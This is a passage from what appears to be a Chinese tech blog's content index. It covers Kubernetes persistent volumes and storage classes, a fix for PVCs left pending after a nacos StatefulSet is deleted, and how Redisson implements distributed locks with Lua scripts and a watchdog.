在过去，使用了注释volume.beta.kubernetes.io/storage-class而不是storageClassName属性。 该注释仍然可以工作，但将来Kubernetes版本将不再适用。\nReclaim Policy 目前的回收政策是：\nRetain – manual reclamation Recycle – basic scrub (“rm -rf /thevolume/*”) Delete – associated storage asset such as AWS EBS, GCE PD, Azure Disk, or OpenStack Cinder volume is deleted 目前，只有NFS和HostPath支持回收。 AWS EBS，GCE PD，Azure Disk和Cinder卷支持删除\nPhase 卷将处于以下阶段之一：\nAvailable – a free resource that is not yet bound to a claim Bound – the volume is bound to a claim Released – the claim has been deleted, but the resource is not yet reclaimed by the cluster Failed – the volume has failed its automatic reclamation Mount Options Kubernetes管理员可以指定在一个节点上挂载一个持久卷时的其他安装选项。 您可以通过使用持久卷上的注释volume.beta.kubernetes.io/mount-options来指定安装选项。\napiVersion: \u0026quot;v1\u0026quot; kind: \u0026quot;PersistentVolume\u0026quot; metadata: name: gce-disk-1 annotations: volume.beta.kubernetes.io/mount-options: \u0026quot;discard\u0026quot; spec: capacity: storage: \u0026quot;10Gi\u0026quot; accessModes: - \u0026quot;ReadWriteOnce\u0026quot; gcePersistentDisk: fsType: \u0026quot;ext4\u0026quot; pdName: \u0026quot;gce-disk-1 安装选项是一个字符串，在将卷安装到磁盘时将被累积地连接和使用。\n请注意，并非所有Persistent卷类型都支持安装选项。 在Kubernetes 1.6版中，以下卷类型支持安装选项。\nGCEPersistentDisk AWSElasticBlockStore AzureFile AzureDisk NFS iSCSI RBD (Ceph Block Device) CephFS Cinder (OpenStack block storage) Glusterfs VsphereVolume Quobyte Volumes VMware Photon PersistentVolumeClaims 每个PVC包含spec和status\nkind: PersistentVolumeClaim apiVersion: v1 metadata: name: myclaim spec: accessModes: - ReadWriteOnce resources: requests: storage: 8Gi storageClassName: slow selector: matchLabels: release: \u0026quot;stable\u0026quot; matchExpressions: - {key: environment, operator: In, values: [dev]} Access Modes 当请求具有特定访问模式的存储时，声明使用与卷相同的约定\nResources 声明（如pod）可以请求特定数量的资源。 在这种情况下，请求用于存储。 相同的资源模型适用于卷和声明\nSelector 声明可以指定标签选择器以进一步过滤该卷集。 只有标签与选择器匹配的卷才能绑定到声明。 选择器可以由两个字段组成：\nmatchLabels - 卷必须具有带此值的标签 matchExpressions - 通过指定关键字和值的关键字，值列表和运算符所做的要求列表。 有效运算符包括In，NotIn，Exists和DoesNotExist。 所有来自matchLabels和matchExpressions的要求都与AND一起使用，所有这些要求都必须满足才能匹配。\nClass 声明可以通过使用属性storageClassName指定StorageClass的名称来请求特定的类。只有所请求的类的PV，与PVC相同的storageClassName的PV可以绑定到PVC。\nPVC不一定要求一个班级。它的storageClassName设置为等于“”的PVC总是被解释为请求没有类的PV，因此它只能绑定到没有类的PV（没有注释或一个等于“”）。没有storageClassName的PVC不完全相同，并且根据是否启用了DefaultStorageClass入门插件，集群的处理方式不同。\n如果接纳插件已打开，则管理员可以指定默认的StorageClass。没有storageClassName的所有PVC只能绑定到该默认的PV。通过将StorageClass对象中的annotation storageclass.kubernetes.io/is-default-class设置为“true”来指定默认的StorageClass。如果管理员没有指定默认值，则集群会对PVC创建做出响应，就像入门插件被关闭一样。如果指定了多个默认值，则验收插件禁止创建所有PVC。 如果入门插件已关闭，则不存在默认StorageClass的概念。没有storageClassName的所有PVC只能绑定到没有类的PV。在这种情况下，没有storageClassName的PVC的处理方式与将其storageClassName设置为“”的PVC相同。\n根据安装方法，安装过程中可以通过addon manager在Kubernetes群集中部署默认的StorageClass。\n当PVC指定一个选择器，除了请求一个StorageClass之外，这些要求被AND组合在一起：只有所请求的类和所请求的标签的PV可能被绑定到PVC。请注意，当前，具有非空选择器的PVC不能为其动态配置PV。\n在过去，使用了注释volume.beta.kubernetes.io/storage-class，而不是storageClassName属性。该注释仍然可以工作，但在未来的Kubernetes版本中它将不被支持。\n声明PVC作为Volumes Pods通过将声明用作卷来访问存储。 声明必须存在于与使用声明的pod相同的命名空间中。 群集在pod的命名空间中查找声明，并使用它来获取支持声明的PersistentVolume。 然后将体积安装到主机并进入Pod。\nkind: Pod apiVersion: v1 metadata: name: mypod spec: containers: - name: myfrontend image: dockerfile/nginx volumeMounts: - mountPath: \u0026quot;/var/www/html\u0026quot; name: mypd volumes: - name: mypd persistentVolumeClaim: claimName: myclaim PersistentVolumes绑定是独占的，并且由于PersistentVolumeClaims是命名空间对象，所以只能在一个命名空间内安装“许多”模式（ROX，RWX）—PVC支持被多个pod挂载\nStorageClasses 每个StorageClass包含字段provisioninger和参数，当属于类的PersistentVolume需要动态配置时使用。\nStorageClass对象的名称很重要，用户可以如何请求特定的类。 管理员在首次创建StorageClass对象时设置类的名称和其他参数，并且在创建对象后无法更新对象。\n管理员可以仅为不要求任何特定类绑定的PVC指定默认的StorageClass：有关详细信息，请参阅PersistentVolumeClaim部分。\nkind: StorageClass apiVersion: storage.k8s.io/v1 metadata: name: standard provisioner: kubernetes.io/aws-ebs parameters: type: gp2 Provisioner 存储类有一个供应商，它确定用于配置PV的卷插件。 必须指定此字段。\n您不限于指定此处列出的“内部”供应商（其名称前缀为“kubernetes.io”并与Kubernetes一起运送）。 您还可以运行和指定外部提供程序，它们是遵循Kubernetes定义的规范的独立程序。 外部提供者的作者对代码的生命周期，供应商的运输状况，运行状况以及使用的卷插件（包括Flex）等都有充分的自主权。存储库kubernetes-incubator /外部存储库包含一个库 用于编写实施大部分规范的外部提供者以及各种社区维护的外部提供者。\nParameters 存储类具有描述属于存储类的卷的参数。 取决于供应商，可以接受不同的参数。 例如，参数类型的值io1和参数iopsPerGB特定于EBS。 当省略参数时，使用一些默认值。\nAWS/GCE/Glusterfs/\nOpenStack Cinder\nkind: StorageClass apiVersion: storage.k8s.io/v1 metadata: name: gold provisioner: kubernetes.io/cinder parameters: type: fast availability: nova type: VolumeType created in Cinder. Default is empty. availability: Availability Zone. If not specified, volumes are generally round-robin-ed across all active zones where Kubernetes cluster has a node. 其它类型的storageClass配置参考\nhttps://kubernetes.io/docs/concepts/storage/persistent-volumes/#types-of-persistent-volumes 配置 如果您正在编写在各种群集上运行并需要持久存储的配置模板或示例，我们建议您使用以下模式：\n在您的配置文件夹（包括部署，ConfigMaps等）中包含PersistentVolumeClaim对象。 在配置中不要包含PersistentVolume对象，因为实例化配置的用户可能没有创建PersistentVolumes的权限。 给用户提供实例化模板时提供存储类名称的选项。 １．　如果用户提供存储类名称，并且集群是1.4或更高版本，请将该值放入PVC的volume.beta.kubernetes.io/storage-class注释中。如果集群的管理员启用了StorageClasses，这将导致PVC与正确的存储类匹配。 ２．　如果用户不提供存储类名称或者集群是版本1.3，那么在PVC上放置一个volume.alpha.kubernetes.io/storage-class：default注释。 这将导致在某些群集上为用户自动配置PV，并具有合理的默认特性。 尽管在名称中使用了alpha，但这个注释背后的代码具有beta级别的支持。 ３．　不要使用volume.beta.kubernetes.io/storage-class：包含空字符串的任何值，因为它将阻止DefaultStorageClass接纳控制器运行（如果启用）。\n在您的工具中，请注意在一段时间后未绑定的PVC，并将其表示给用户，因为这可能表明集群没有动态存储支持（在这种情况下，用户应创建匹配的PV）或集群没有存储系统（在这种情况下，用户无法部署需要PVC的配置）。\n在将来，我们预计大多数集群都将启用DefaultStorageClass，并提供某种形式的存储。但是，可能没有任何存储类名可用于所有集群，因此默认情况下继续不设置。在某种程度上，alpha注释将不再有意义，但PVC上的未设置的storageClass字段将具有所需的效果。\n译者：阿仆来耶 http://blog.csdn.net/jettery/article/details/72722324 \n参考链接\nhttps://www.kubernetes.org.cn/ http://docs.kubernetes.org.cn/ ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%9F%BA%E7%A1%80/k8s%E5%9F%BA%E7%A1%80/k8s%E8%B5%84%E6%BA%90%E5%AF%B9%E8%B1%A1/pv-pvc-storageclass/","series":["k8s"],"tags":["云原生","k8s"],"title":"PV/PVC/StorageClass"},{"categories":["云原生"],"content":"pvc不会主动回收问题\n使用k8s部署nacos的时候发现，通过volumeClaimTemplates配置的pvc不会随着使用kubectl delete -f xxx.yaml 删除StatefulSet的时候一同被删除。nacos-pvc-nfs.yaml文件如下所示：\n--- apiVersion: v1 kind: Service metadata: name: nacos-headless labels: app: nacos annotations: service.alpha.kubernetes.io/tolerate-unready-endpoints: \u0026#34;true\u0026#34; spec: ports: - port: 8848 name: server targetPort: 8848 - port: 7848 name: rpc targetPort: 7848 clusterIP: None selector: app: nacos --- apiVersion: v1 kind: ConfigMap metadata: name: nacos-cm data: mysql.db.name: \u0026#34;nacos_devtest\u0026#34; mysql.port: \u0026#34;3306\u0026#34; mysql.user: \u0026#34;nacos\u0026#34; mysql.password: \u0026#34;nacos\u0026#34; --- apiVersion: apps/v1 kind: StatefulSet metadata: name: nacos spec: serviceName: nacos-headless replicas: 3 template: metadata: labels: app: nacos annotations: pod.alpha.kubernetes.io/initialized: \u0026#34;true\u0026#34; spec: affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchExpressions: - key: \u0026#34;app\u0026#34; operator: In values: - nacos topologyKey: \u0026#34;kubernetes.io/hostname\u0026#34; serviceAccountName: nfs-client-provisioner initContainers: - name: peer-finder-plugin-install image: nacos/nacos-peer-finder-plugin:1.0 imagePullPolicy: Always volumeMounts: - mountPath: \u0026#34;/home/nacos/plugins/peer-finder\u0026#34; name: nacos-plugindir containers: - name: nacos imagePullPolicy: Always image: nacos/nacos-server:latest resources: requests: memory: \u0026#34;2Gi\u0026#34; cpu: \u0026#34;500m\u0026#34; ports: - containerPort: 8848 name: client-port - containerPort: 7848 name: rpc env: - name: NACOS_REPLICAS value: \u0026#34;3\u0026#34; - name: SERVICE_NAME value: \u0026#34;nacos-headless\u0026#34; - name: DOMAIN_NAME value: \u0026#34;cluster.local\u0026#34; - name: POD_NAMESPACE valueFrom: fieldRef: apiVersion: v1 fieldPath: metadata.namespace - name: MYSQL_SERVICE_DB_NAME valueFrom: configMapKeyRef: name: nacos-cm key: mysql.db.name - name: MYSQL_SERVICE_PORT valueFrom: configMapKeyRef: name: nacos-cm key: mysql.port - name: MYSQL_SERVICE_USER valueFrom: configMapKeyRef: name: nacos-cm key: mysql.user - name: MYSQL_SERVICE_PASSWORD valueFrom: configMapKeyRef: name: nacos-cm key: mysql.password - name: NACOS_SERVER_PORT value: \u0026#34;8848\u0026#34; - name: NACOS_APPLICATION_PORT value: \u0026#34;8848\u0026#34; - name: PREFER_HOST_MODE value: \u0026#34;hostname\u0026#34; volumeMounts: - name: nacos-plugindir mountPath: /home/nacos/plugins/peer-finder - name: nacos-datadir mountPath: /home/nacos/data - name: nacos-logdir mountPath: /home/nacos/logs volumeClaimTemplates: - metadata: name: nacos-plugindir annotations: volume.beta.kubernetes.io/storage-class: \u0026#34;managed-nfs-storage\u0026#34; spec: accessModes: [ \u0026#34;ReadWriteMany\u0026#34; ] resources: requests: storage: 5Gi - metadata: name: nacos-datadir annotations: volume.beta.kubernetes.io/storage-class: \u0026#34;managed-nfs-storage\u0026#34; spec: accessModes: [ \u0026#34;ReadWriteMany\u0026#34; ] resources: requests: storage: 5Gi - metadata: name: nacos-logdir annotations: volume.beta.kubernetes.io/storage-class: \u0026#34;managed-nfs-storage\u0026#34; spec: accessModes: [ \u0026#34;ReadWriteMany\u0026#34; ] resources: requests: storage: 5Gi selector: matchLabels: app: nacos 上述配置文件中指定的storageclass为managed-nfs-storage，这个名为managed-nfs-storage是不存在的，我创建的storageclass的名称是nfs-storage。\n因此，当使用kubectl create -f nacos-k8s/deploy/nacos/nacos-pvc-nfs.yaml创建的时候，pvc将处于pending状态。\n[root@k8s-master nacos-k8s]# kubectl get pvc NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE nacos-datadir-nacos-0 Pending managed-nfs-storage 149m nacos-logdir-nacos-0 Pending managed-nfs-storage 149m nacos-plugindir-nacos-0 Pending managed-nfs-storage 149m 这时正常人都会想到kubectl delete -f nacos-k8s/deploy/nacos/nacos-pvc-nfs.yaml删除资源，修改storageclass成正确的之后再重新create。但是这样做的结果就是nacos无法启动，也一直pending，通过kubectl describe pod nacos-o可以看到有running \u0026quot;VolumeBinding\u0026quot; filter plugin for pod \u0026quot;nacos-0\u0026quot;: pod has unbound immediate PersistentVolumeClaims的错误提示，查看pod状态如下：\n[root@k8s-master nacos-k8s]# kubectl get pod -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES mysql-59szx 1/1 Running 0 40m 10.109.131.62 k8s-node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nacos-0 0/1 Pending 0 6m10s \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nfs-client-provisioner-6965c6967-z597p 1/1 Running 0 13m 10.111.218.68 k8s-node3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 问题的关键在于名为nacos-datadir-nacos-0 nacos-logdir-nacos-0 nacos-plugindir-nacos-0 的pvc并没有被删除，一直pending，所以pod也跟着pending，解决办法即手动删除这些pending的pvc。\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%AE%9E%E6%88%98/pvc%E4%B8%8D%E4%BC%9A%E4%B8%BB%E5%8A%A8%E5%9B%9E%E6%94%B6%E9%97%AE%E9%A2%98/","series":["k8s实战"],"tags":["云原生","k8s"],"title":"pvc不会主动回收问题"},{"categories":["编程思想"],"content":"使用 set key value ex/px 秒/毫秒 xx/nx 的命令实现分布式锁，存在多个client端加锁成功的极端情况。Redisson使用RedLock可以避免这个问题，其原理是多锁，例如对多个哨兵集群加不同的锁，只有超半数以上的哨兵集群反馈加锁成功才算加锁成功。另外，Redisson还通过WatchDog实现了锁续租。还实现了很多有用的数据结构（RedissonPriorityDeque）和分布式同步工具（RedissonCountDownLatch, RedissonSemaphore）\n写在前面 在了解分布式锁具体实现方案之前，我们应该先思考一下使用分布式锁必须要考虑的一些问题。\n 互斥性：在任意时刻，只能有一个进程持有锁。 防死锁：即使有一个进程在持有锁的期间崩溃而未能主动释放锁，要有其他方式去释放锁从而保证其他进程能获取到锁。 加锁和解锁的必须是同一个进程。 锁的续期问题。  常见的分布式锁实现方案  基于 Redis 实现分布式锁 基于 Zookeeper 实现分布式锁  本文采用第一种方案，也就是基于 Redis 的分布式锁实现方案。\nRedis 实现分布式锁主要步骤  指定一个 key 作为锁标记，存入 Redis 中，指定一个 唯一的用户标识 作为 value。 当 key 不存在时才能设置值，确保同一时间只有一个客户端进程获得锁，满足 互斥性 特性。 设置一个过期时间，防止因系统异常导致没能删除这个 key，满足 防死锁 特性。 当处理完业务之后需要清除这个 key 来释放锁，清除 key 时需要校验 value 值，需要满足 只有加锁的人才能释放锁 。   特别注意：以上实现步骤考虑到了使用分布式锁需要考虑的互斥性、防死锁、加锁和解锁必须为同一个进程等问题，但是锁的续期无法实现。所以，博主采用 Redisson 实现 Redis 的分布式锁，借助 Redisson 的 WatchDog 机制 能够很好的解决锁续期的问题，同样 Redisson 也是 Redis 官方推荐分布式锁实现方案，实现起来较为简单。\n Redisson 实现分布式锁  具体实现代码已经上传到博主的仓库，需要的朋友可以在公众号内回复 【分布式锁代码】 获取码云或 GitHub 项目下载地址。\n 下面从加锁机制、锁互斥机制、Watch dog 机制、可重入加锁机制、锁释放机制、等五个方面对 Redisson 实现分布式锁的底层原理进行分析。\n加锁原理 加锁其实是通过一段 lua 脚本实现的，如下：\n我们把这一段 lua 脚本抽出来看：\nif (redis.call(\u0026#39;exists\u0026#39;, KEYS[1]) == 0) then \u0026#34; + \u0026#34;redis.call(\u0026#39;hincrby\u0026#39;, KEYS[1], ARGV[2], 1); \u0026#34; + \u0026#34;redis.call(\u0026#39;pexpire\u0026#39;, KEYS[1], ARGV[1]); \u0026#34; + \u0026#34;return nil; \u0026#34; + \u0026#34;end; \u0026#34; + \u0026#34;if (redis.call(\u0026#39;hexists\u0026#39;, KEYS[1], ARGV[2]) == 1) then \u0026#34; + \u0026#34;redis.call(\u0026#39;hincrby\u0026#39;, KEYS[1], ARGV[2], 1); \u0026#34; + \u0026#34;redis.call(\u0026#39;pexpire\u0026#39;, KEYS[1], ARGV[1]); \u0026#34; + \u0026#34;return nil; \u0026#34; + \u0026#34;end; \u0026#34; + \u0026#34;return redis.call(\u0026#39;pttl\u0026#39;, KEYS[1]);\u0026#34; 这里 KEYS[1] 代表的是你加锁的 key，比如你自己设置了加锁的那个锁 key 就是 “myLock”。\n// create a lock RLock lock = redisson.getLock(\u0026#34;myLock\u0026#34;); 这里 ARGV[1] 代表的是锁 key 的默认生存时间，默认 30 秒。ARGV[2] 代表的是加锁的客户端的 ID，类似于下面这样：285475da-9152-4c83-822a-67ee2f116a79:52。至于最后面的一个 1 是为了后面可重入做的计数统计，后面会有讲解到。\n我们来看一下在 Redis 中的存储结构：\n127.0.0.1:6379\u0026gt; HGETALL myLock 1) \u0026#34;285475da-9152-4c83-822a-67ee2f116a79:52\u0026#34; 2) \u0026#34;1\u0026#34; 上面这一段加锁的 lua 脚本的作用是：第一段 if 判断语句，就是用 exists myLock 命令判断一下，如果你要加锁的那个锁 key 不存在的话，你就进行加锁。如何加锁呢？使用 hincrby 命令设置一个 hash 结构，类似于在 Redis 中使用下面的操作：\n127.0.0.1:6379\u0026gt; HINCRBY myLock 285475da-9152-4c83-822a-67ee2f116a79:52 1 (integer) 1 接着会执行 pexpire myLock 30000 命令，设置 myLock 这个锁 key 的生存时间是 30 秒。到此为止，加锁完成。\n有的小伙伴可能此时就有疑问了，如果此时有第二个客户端请求加锁呢？ 这就是下面要说的锁互斥机制。\n锁互斥机制 此时，如果客户端 2 来尝试加锁，会如何呢？首先，第一个 if 判断会执行 exists myLock，发现 myLock 这个锁 key 已经存在了。接着第二个 if 判断，判断一下，myLock 锁 key 的 hash 数据结构中，是否包含客户端 2 的 ID，这里明显不是，因为那里包含的是客户端 1 的 ID。所以，客户端 2 会执行：\nreturn redis.call(\u0026#39;pttl\u0026#39;, KEYS[1]); 返回的一个数字，这个数字代表了 myLock 这个锁 key 的剩余生存时间。\n接下来我们看一下 Redissson tryLock 的主流程：\n@Override public boolean tryLock(long waitTime, long leaseTime, TimeUnit unit) throws InterruptedException { long time = unit.toMillis(waitTime); long current = System.currentTimeMillis(); long threadId = Thread.currentThread().getId(); // 1.尝试获取锁  Long ttl = tryAcquire(leaseTime, unit, threadId); // lock acquired  if (ttl == null) { return true; } // 申请锁的耗时如果大于等于最大等待时间，则申请锁失败.  time -= System.currentTimeMillis() - current; if (time \u0026lt;= 0) { acquireFailed(threadId); return false; } current = System.currentTimeMillis(); /** * 2.订阅锁释放事件： * 基于信息量，当锁被其它资源占用时，当前线程通过 Redis 的 channel 订阅锁的释放事件，一旦锁释放会发消息通知待等待的线程进行竞争. */ // 订阅监听redis消息，并且创建RedissonLockEntry，其中RedissonLockEntry中比较关键的是一个 Semaphore属性对象,用来控制本地的锁请求的信号量同步，返回的是netty框架的Future实现。  RFuture\u0026lt;RedissonLockEntry\u0026gt; subscribeFuture = subscribe(threadId); // 阻塞等待subscribe的future的结果对象，如果subscribe方法调用超过了time，说明已经超过了客户端设置的最大wait time，则直接返回false，取消订阅，不再继续申请锁了。  // 只有await返回true，才进入循环尝试获取锁  if (!subscribeFuture.await(time, TimeUnit.MILLISECONDS)) { if (!subscribeFuture.cancel(false)) { subscribeFuture.onComplete((res, e) -\u0026gt; { if (e == null) { unsubscribe(subscribeFuture, threadId); } }); } acquireFailed(threadId); return false; } try { // 计算获取锁的总耗时，如果大于等于最大等待时间，则获取锁失败.  time -= System.currentTimeMillis() - current; if (time \u0026lt;= 0) { acquireFailed(threadId); return false; } /** * 3.收到锁释放的信号后，在最大等待时间之内，循环一次接着一次的尝试获取锁 * 获取锁成功，则立马返回 true， * 若在最大等待时间之内还没获取到锁，则认为获取锁失败，返回 false 结束循环 */ while (true) { long currentTime = System.currentTimeMillis(); // 再次尝试获取锁  ttl = tryAcquire(leaseTime, unit, threadId); // lock acquired  if (ttl == null) { return true; } // 超过最大等待时间则返回 false 结束循环，获取锁失败  time -= System.currentTimeMillis() - currentTime; if (time \u0026lt;= 0) { acquireFailed(threadId); return false; } /** * 6.阻塞等待锁（通过信号量(共享锁)阻塞,等待解锁消息）： */ currentTime = System.currentTimeMillis(); if (ttl \u0026gt;= 0 \u0026amp;\u0026amp; ttl \u0026lt; time) { //如果剩余时间(ttl)小于wait time ,就在 ttl 时间内，从Entry的信号量获取一个许可(除非被中断或者一直没有可用的许可)。  getEntry(threadId).getLatch().tryAcquire(ttl, TimeUnit.MILLISECONDS); } else { //则就在wait time 时间范围内等待可以通过信号量  getEntry(threadId).getLatch().tryAcquire(time, TimeUnit.MILLISECONDS); } // 更新剩余的等待时间(最大等待时间-已经消耗的阻塞时间)  time -= System.currentTimeMillis() - currentTime; if (time \u0026lt;= 0) { acquireFailed(threadId); return false; } } } finally { // 7.无论是否获得锁,都要取消订阅解锁消息  unsubscribe(subscribeFuture, threadId); } // return get(tryLockAsync(waitTime, leaseTime, unit));  } 流程分析：\n 尝试获取锁，返回 null 则说明加锁成功，返回一个数值，则说明已经存在该锁，ttl 为锁的剩余存活时间。 如果此时客户端 2 进程获取锁失败，那么使用客户端 2 的线程 id（其实本质上就是进程 id）通过 Redis 的 channel 订阅锁释放的事件。如果等待的过程中一直未等到锁的释放事件通知，当超过最大等待时间则获取锁失败，返回 false，也就是第 39 行代码。如果等到了锁的释放事件的通知，则开始进入一个不断重试获取锁的循环。 循环中每次都先试着获取锁，并得到已存在的锁的剩余存活时间。如果在重试中拿到了锁，则直接返回。如果锁当前还是被占用的，那么等待释放锁的消息，具体实现使用了 JDK 的信号量 Semaphore 来阻塞线程，当锁释放并发布释放锁的消息后，信号量的 release() 方法会被调用，此时被信号量阻塞的等待队列中的一个线程就可以继续尝试获取锁了。   特别注意：以上过程存在一个细节，这里有必要说明一下，也是分布式锁的一个关键点：当锁正在被占用时，等待获取锁的进程并不是通过一个 while(true) 死循环去获取锁，而是利用了 Redis 的发布订阅机制,通过 Semaphore的tryAcquire方法阻塞等待锁的进程，有效的解决了无效的锁申请浪费资源的问题。\n 锁的续期机制 客户端 1 加锁的锁 key 默认生存时间才 30 秒，如果超过了 30 秒，客户端 1 还想一直持有这把锁，怎么办呢？\nRedisson 提供了一个续期机制， 只要客户端 1 一旦加锁成功，就会启动一个 Watch Dog。\nprivate \u0026lt;T\u0026gt; RFuture\u0026lt;Long\u0026gt; tryAcquireAsync(long leaseTime, TimeUnit unit, long threadId) { if (leaseTime != -1) { return tryLockInnerAsync(leaseTime, unit, threadId, RedisCommands.EVAL_LONG); } RFuture\u0026lt;Long\u0026gt; ttlRemainingFuture = tryLockInnerAsync(commandExecutor.getConnectionManager().getCfg().getLockWatchdogTimeout(), TimeUnit.MILLISECONDS, threadId, RedisCommands.EVAL_LONG); ttlRemainingFuture.onComplete((ttlRemaining, e) -\u0026gt; { if (e != null) { return; } // lock acquired  if (ttlRemaining == null) { scheduleExpirationRenewal(threadId); } }); return ttlRemainingFuture; }  注意：从以上源码我们看到 leaseTime 必须是 -1 才会开启 Watch Dog 机制，也就是如果你想开启 Watch Dog 机制必须使用默认的加锁时间为 30s。如果你自己自定义时间，超过这个时间，锁就会自定释放，并不会延长。\n private void scheduleExpirationRenewal(long threadId) { ExpirationEntry entry = new ExpirationEntry(); ExpirationEntry oldEntry = EXPIRATION_RENEWAL_MAP.putIfAbsent(getEntryName(), entry); if (oldEntry != null) { oldEntry.addThreadId(threadId); } else { entry.addThreadId(threadId); renewExpiration(); } } protected RFuture\u0026lt;Boolean\u0026gt; renewExpirationAsync(long threadId) { return commandExecutor.evalWriteAsync(getName(), LongCodec.INSTANCE, RedisCommands.EVAL_BOOLEAN, \u0026#34;if (redis.call(\u0026#39;hexists\u0026#39;, KEYS[1], ARGV[2]) == 1) then \u0026#34; + \u0026#34;redis.call(\u0026#39;pexpire\u0026#39;, KEYS[1], ARGV[1]); \u0026#34; + \u0026#34;return 1; \u0026#34; + \u0026#34;end; \u0026#34; + \u0026#34;return 0;\u0026#34;, Collections.\u0026lt;Object\u0026gt;singletonList(getName()), internalLockLeaseTime, getLockName(threadId)); } Watch Dog 机制其实就是一个后台定时任务线程，获取锁成功之后，会将持有锁的线程放入到一个 RedissonLock.EXPIRATION_RENEWAL_MAP里面，然后每隔 10 秒 （internalLockLeaseTime / 3） 检查一下，如果客户端 1 还持有锁 key（判断客户端是否还持有 key，其实就是遍历 EXPIRATION_RENEWAL_MAP 里面线程 id 然后根据线程 id 去 Redis 中查，如果存在就会延长 key 的时间），那么就会不断的延长锁 key 的生存时间。\n 注意：这里有一个细节问题，如果服务宕机了，Watch Dog 机制线程也就没有了，此时就不会延长 key 的过期时间，到了 30s 之后就会自动过期了，其他线程就可以获取到锁。\n 可重入加锁机制 Redisson 也是支持可重入锁的，比如下面这种代码：\n@Override public void lock() { RLock lock = redissonSingle.getLock(\u0026#34;myLock\u0026#34;); try { lock.lock(); // 执行业务  doBusiness(); lock.lock(); } catch (Exception e) { e.printStackTrace(); } finally { // 释放锁  lock.unlock(); lock.unlock(); logger.info(\u0026#34;任务执行完毕, 释放锁!\u0026#34;); } } 我们再分析一下加锁那段 lua 代码：\nif (redis.call(\u0026#39;exists\u0026#39;, KEYS[1]) == 0) then \u0026#34; + \u0026#34;redis.call(\u0026#39;hincrby\u0026#39;, KEYS[1], ARGV[2], 1); \u0026#34; + \u0026#34;redis.call(\u0026#39;pexpire\u0026#39;, KEYS[1], ARGV[1]); \u0026#34; + \u0026#34;return nil; \u0026#34; + \u0026#34;end; \u0026#34; + \u0026#34;if (redis.call(\u0026#39;hexists\u0026#39;, KEYS[1], ARGV[2]) == 1) then \u0026#34; + \u0026#34;redis.call(\u0026#39;hincrby\u0026#39;, KEYS[1], ARGV[2], 1); \u0026#34; + \u0026#34;redis.call(\u0026#39;pexpire\u0026#39;, KEYS[1], ARGV[1]); \u0026#34; + \u0026#34;return nil; \u0026#34; + \u0026#34;end; \u0026#34; + \u0026#34;return redis.call(\u0026#39;pttl\u0026#39;, KEYS[1]);\u0026#34; 第一个 if 判断肯定不成立，exists myLock 会显示锁 key 已经存在。第二个 if 判断会成立，因为 myLock 的 hash 数据结构中包含的那个 ID 即客户端 1 的 ID，此时就会执行可重入加锁的逻辑，使用：hincrby myLock 285475da-9152-4c83-822a-67ee2f116a79:52 1 对客户端 1 的加锁次数加 1。此时 myLock 数据结构变为下面这样：\n127.0.0.1:6379\u0026gt; HGETALL myLock 1) \u0026#34;285475da-9152-4c83-822a-67ee2f116a79:52\u0026#34; 2) \u0026#34;2\u0026#34; 到这里，小伙伴本就都明白了 hash 结构的 key 是锁的名称，field 是客户端 ID，value 是该客户端加锁的次数。\n这里有一个细节，如果加锁支持可重入锁，那么解锁呢？\n释放锁机制 执行\nlock.unlock() 就可以释放分布式锁。我们来看一下释放锁的流程代码：\n@Override public RFuture\u0026lt;Void\u0026gt; unlockAsync(long threadId) { RPromise\u0026lt;Void\u0026gt; result = new RedissonPromise\u0026lt;Void\u0026gt;(); // 1. 异步释放锁  RFuture\u0026lt;Boolean\u0026gt; future = unlockInnerAsync(threadId); // 取消 Watch Dog 机制  future.onComplete((opStatus, e) -\u0026gt; { cancelExpirationRenewal(threadId); if (e != null) { result.tryFailure(e); return; } if (opStatus == null) { IllegalMonitorStateException cause = new IllegalMonitorStateException(\u0026#34;attempt to unlock lock, not locked by current thread by node id: \u0026#34; + id + \u0026#34; thread-id: \u0026#34; + threadId); result.tryFailure(cause); return; } result.trySuccess(null); }); return result; } protected RFuture\u0026lt;Boolean\u0026gt; unlockInnerAsync(long threadId) { return commandExecutor.evalWriteAsync(getName(), LongCodec.INSTANCE, RedisCommands.EVAL_BOOLEAN, // 判断锁 key 是否存在  \u0026#34;if (redis.call(\u0026#39;hexists\u0026#39;, KEYS[1], ARGV[3]) == 0) then \u0026#34; + \u0026#34;return nil;\u0026#34; + \u0026#34;end; \u0026#34; + // 将该客户端对应的锁的 hash 结构的 value 值递减为 0 后再进行删除  // 然后再向通道名为 redisson_lock__channel publish 一条 UNLOCK_MESSAGE 信息  \u0026#34;local counter = redis.call(\u0026#39;hincrby\u0026#39;, KEYS[1], ARGV[3], -1); \u0026#34; + \u0026#34;if (counter \u0026gt; 0) then \u0026#34; + \u0026#34;redis.call(\u0026#39;pexpire\u0026#39;, KEYS[1], ARGV[2]); \u0026#34; + \u0026#34;return 0; \u0026#34; + \u0026#34;else \u0026#34; + \u0026#34;redis.call(\u0026#39;del\u0026#39;, KEYS[1]); \u0026#34; + \u0026#34;redis.call(\u0026#39;publish\u0026#39;, KEYS[2], ARGV[1]); \u0026#34; + \u0026#34;return 1; \u0026#34;+ \u0026#34;end; \u0026#34; + \u0026#34;return nil;\u0026#34;, Arrays.\u0026lt;Object\u0026gt;asList(getName(), getChannelName()), LockPubSub.UNLOCK_MESSAGE, internalLockLeaseTime, getLockName(threadId)); } 从以上代码来看，释放锁的步骤主要分三步：\n 删除锁（这里注意可重入锁，在上面的脚本中有详细分析）。 广播释放锁的消息，通知阻塞等待的进程（向通道名为 redisson_lock__channel publish 一条 UNLOCK_MESSAGE 信息）。 取消 Watch Dog 机制，即将 RedissonLock.EXPIRATION_RENEWAL_MAP 里面的线程 id 删除，并且 cancel 掉 Netty 的那个定时任务线程。  方案优点  Redisson 通过 Watch Dog 机制很好的解决了锁的续期问题。 和 Zookeeper 相比较，Redisson 基于 Redis 性能更高，适合对性能要求高的场景。 通过 Redisson 实现分布式可重入锁，比原生的 SET mylock userId NX PX milliseconds + lua 